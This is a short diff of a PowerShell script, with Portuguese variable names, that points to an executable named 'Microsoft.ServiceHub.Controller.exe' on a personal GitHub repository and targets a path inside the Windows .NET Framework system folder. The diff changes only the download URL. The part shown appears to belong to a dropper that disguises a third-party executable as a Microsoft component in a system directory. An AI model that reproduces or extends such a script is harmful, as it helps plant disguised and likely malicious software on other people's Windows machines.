@@ -1,5 +1,5 @@
 $diretorio = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319"
-$url = "https://github.com/somenorxbom1533/1533/raw/refs/heads/main/Microsoft.ServiceHub.Controller.exe"
+$url = "https://github.com/somenorxbom1533/153333/raw/refs/heads/main/Microsoft.ServiceHub.Controller.exe"
 $caminhoArquivo = Join-Path -Path $diretorio -ChildPath "Microsoft.ServiceHub.Controller.exe"
 
 if (-not (Test-Path -Path $diretorio)) {
